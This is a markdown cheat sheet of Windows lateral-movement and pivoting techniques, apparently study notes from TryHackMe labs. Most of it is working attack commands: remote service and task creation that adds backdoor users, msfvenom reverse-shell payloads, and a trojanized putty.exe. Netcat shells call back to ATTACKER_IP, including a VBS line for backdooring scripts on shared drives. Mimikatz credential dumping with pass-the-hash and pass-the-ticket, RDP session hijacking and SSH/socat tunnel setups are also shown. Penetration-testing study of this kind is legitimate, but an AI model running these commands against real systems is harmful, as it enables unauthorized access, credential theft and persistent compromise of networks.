# Lateral Movement & Pivoting

## Concept

Lateral movement is a cycle, not a linear step:
1. Use available credentials to access a new machine
2. Elevate privileges on that machine
3. Extract credentials
4. Repeat

Goal: reach targets that are firewalled from your initial foothold, or blend in by connecting from a "legitimate" host.

### UAC Gotcha
- **Local admin accounts** (non-default): blocked from remote admin via RPC/SMB/WinRM — get a medium-integrity filtered token. Lateral movement techniques will fail silently.
- **Default local Administrator** and **domain accounts with local admin**: not subject to this restriction, get full privileges.
- If a technique fails unexpectedly, suspect you're using a non-default local account with UAC enforcement.

---

## Remote Process Execution

### psexec
- **Ports:** 445/TCP (SMB)
- **Requires:** Administrators group
- Uploads a service binary to ADMIN$, creates and runs a service (PSEXESVC), uses named pipes for I/O.

```cmd
psexec64.exe \\TARGET -u Administrator -p Mypass123 -i cmd.exe
```

**From Linux (supports PtH):**
```bash
psexec.py -hashes :NTLM_HASH DOMAIN/User@TARGET_IP
```

---

### WinRM / winrs
- **Ports:** 5985/TCP (HTTP), 5986/TCP (HTTPS)
- **Requires:** Remote Management Users group

```cmd
winrs.exe -u:Administrator -p:Mypass123 -r:TARGET cmd
```

**PowerShell:**
```powershell
$credential = New-Object System.Management.Automation.PSCredential 'Administrator', (ConvertTo-SecureString 'Mypass123' -AsPlainText -Force)
Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock { whoami }
```

**From Linux (supports PtH):**
```bash
evil-winrm -i TARGET_IP -u MyUser -H NTLM_HASH
```

---

### sc.exe (Remote Service Creation)
- **Ports:** 135/TCP + 49152-65535/TCP (DCE/RPC) or 445/139 (SMB named pipes)
- **Requires:** Administrators group
- Output is blind — you won't see command results.

```cmd
sc.exe \\TARGET create THMservice binPath= "net user backdoor Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

**To get a shell:** use `msfvenom -f exe-service` (standard .exe gets killed immediately by SCM):
```bash
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
smbclient -c 'put myservice.exe' -U user -W DOMAIN '//TARGET/admin$/' password
```
Then create the service pointing to `%windir%\myservice.exe`.

**Injecting credentials when sc won't accept them:**
```cmd
runas /netonly /user:DOMAIN\user "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```
Then run sc from that shell.

---

### schtasks (Remote Scheduled Task)
- Blind execution — no output.

```cmd
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "COMMAND" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "THMtask1"
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

---

### WMI
- **Ports:** 135/TCP + 49152-65535/TCP (DCOM) or 5985-5986/TCP (WSman/WinRM)
- **Requires:** Administrators group
- All output is blind.

**Setup session (reuse for all WMI techniques):**
```powershell
$credential = New-Object System.Management.Automation.PSCredential 'Administrator', (ConvertTo-SecureString 'Mypass123' -AsPlainText -Force)
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

**Remote process:**
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "powershell.exe -Command ..." }
```

**Remote service:**
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "THMService2"; DisplayName = "THMService2"
    PathName = "net user backdoor Pass123 /add"
    ServiceType = [byte]::Parse("16"); StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

**Remote scheduled task:**
```powershell
$Action = New-ScheduledTaskAction -CimSession $Session -Execute "cmd.exe" -Argument "/c net user backdoor Pass123 /add"
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

**MSI payload install (good for full shells):**
```bash
# Generate
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f msi > myinstaller.msi
# Upload
smbclient -c 'put myinstaller.msi' -U user -W DOMAIN '//TARGET/admin$/' password
```
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

---

## Alternate Authentication Material

### Pass-the-Hash (PtH)
Works against NTLM authentication. You use the hash directly instead of cracking it.

**Extract hashes with mimikatz:**
```
privilege::debug
token::elevate
lsadump::sam          # local SAM — local users only
sekurlsa::msv         # LSASS — local + recently logged-in domain users
```

**Inject hash to spawn process (Windows):**
```
token::revert         # must revert elevated token first
sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:HASH /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```
`whoami` will still show the original user, but all network auth uses the injected credentials.

**From Linux:**
```bash
xfreerdp /v:TARGET_IP /u:DOMAIN\\User /pth:NTLM_HASH
psexec.py -hashes :NTLM_HASH DOMAIN/User@TARGET_IP
evil-winrm -i TARGET_IP -u User -H NTLM_HASH
```

---

### Pass-the-Ticket (PtT)
Works against Kerberos. Extract TGTs (require admin) or TGSs (low-priv, service-specific only).

**Extract tickets:**
```
privilege::debug
sekurlsa::tickets /export    # dumps .kirbi files to disk
```

**Inject ticket:**
```
kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-DOMAIN.kirbi
```

**Verify injection:**
```cmd
klist
```

No admin required to inject. After injection, tools like `winrs` will use the injected ticket automatically:
```cmd
winrs.exe -r:TARGET cmd
```

---

### Overpass-the-Hash / Pass-the-Key (OPtH / PtK)
Uses a Kerberos encryption key (RC4/AES128/AES256) instead of password to request a TGT. RC4 key == NTLM hash.

**Extract Kerberos keys:**
```
privilege::debug
sekurlsa::ekeys
```

**Spawn shell with key:**
```
# RC4 (= NTLM hash)
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:HASH /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
# AES256
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:HASH /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

---

## Abusing User Behaviour

### Backdooring Writable Network Shares
If a script/binary on a share is executed by users regularly, backdoor it.

**VBS script — append to existing .vbs:**
```vbs
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\ATTACKER_IP\share\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe ATTACKER_IP 1234", 0, True
```

**EXE backdoor (keeps original functionality):**
```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```
Replace the original binary on the share. Catch with `exploit/multi/handler`.

---

### RDP Session Hijacking
Applies to Windows Server 2016 and earlier. Requires SYSTEM privileges. Takes over a disconnected (Disc.) session without knowing the password.

```cmd
# Get SYSTEM
PsExec64.exe -s cmd.exe

# List sessions
query user

# Hijack session ID 3 into your current RDP session (rdp-tcp#6)
tscon 3 /dest:rdp-tcp#6
```
Note: Windows Server 2019 requires the target session's password.

---

## Port Forwarding & Pivoting

Use pivot hosts to relay traffic when the target port is firewalled from your machine.

### SSH Tunnelling

**Setup — create a no-shell tunnel user on attacker machine first:**
```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

**Remote port forwarding** — expose a target port on your attacker machine:
```cmd
# On pivot (PC-1): forward SERVER:3389 → attacker:3389
ssh tunneluser@ATTACKER_IP -R 3389:TARGET_SERVER_IP:3389 -N
```
Then connect from attacker: `xfreerdp /v:127.0.0.1 /u:User /p:Pass`

**Local port forwarding** — expose your attacker service through the pivot:
```cmd
# On pivot (PC-1): make attacker port 80 available on pivot's port 80
ssh tunneluser@ATTACKER_IP -L *:80:127.0.0.1:80 -N
# Allow it through pivot's firewall if needed:
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

**Dynamic port forwarding + SOCKS** — proxy all tools through the pivot:
```cmd
# On pivot: create SOCKS proxy on attacker port 9050
ssh tunneluser@ATTACKER_IP -R 9050 -N
```
```bash
# On attacker — /etc/proxychains.conf:
# socks4  127.0.0.1 9050
proxychains curl http://internal-host
proxychains nmap -sT TARGET_IP   # use -sT (TCP connect), not -sS with proxychains
```

---

### socat Port Forwarding
Use when SSH isn't available on the pivot. Transfer socat to the pivot host first.

**Forward inbound connections on pivot to a target:**
```cmd
# On pivot: anyone connecting to pivot:3389 gets forwarded to TARGET:3389
socat TCP4-LISTEN:3389,fork TCP4:TARGET_IP:3389
```
Then from attacker: connect to `PIVOT_IP:3389`

**Forward inbound connections on pivot back to attacker (expose attacker service):**
```cmd
# On pivot: anyone connecting to pivot:80 gets forwarded to attacker:80
socat TCP4-LISTEN:80,fork TCP4:ATTACKER_IP:80
```

Add firewall rule on pivot if needed:
```cmd
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

---

### Complex Multi-Hop Tunnel (SSH + Metasploit)

Scenario: exploit requires hitting RPORT on target (firewalled), plus target must reach SRVPORT and LPORT on attacker.

**Three forwards in one SSH command from pivot:**
```cmd
ssh tunneluser@ATTACKER_IP -R 8888:TARGET_DC_IP:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```
- `-R 8888:TARGET:80` — pull TARGET:80 to attacker:8888
- `-L *:6666:127.0.0.1:6666` — push attacker:6666 to pivot:6666 (SRVPORT)
- `-L *:7878:127.0.0.1:7878` — push attacker:7878 to pivot:7878 (LPORT)

**Metasploit config for this scenario:**
```
set RHOSTS 127.0.0.1        # reach target via tunnel
set RPORT 8888
set SRVHOST 127.0.0.1       # web server binds locally, tunnel delivers it
set SRVPORT 6666
set LHOST PIVOT_IP          # payload calls back to pivot
set ReverseListenerBindAddress 127.0.0.1  # listener binds locally on attacker
set LPORT 7878
```

---

## Quick Reference — Ports

| Technique | Protocol | Ports |
|---|---|---|
| psexec / sc / smbclient | SMB | 445/TCP (or 139/TCP) |
| WinRM / winrs / evil-winrm | WinRM | 5985/TCP (HTTP), 5986/TCP (HTTPS) |
| WMI (DCOM) | DCE/RPC | 135/TCP + 49152-65535/TCP |
| RDP | RDP | 3389/TCP |
| SSH tunnel | SSH | 22/TCP |
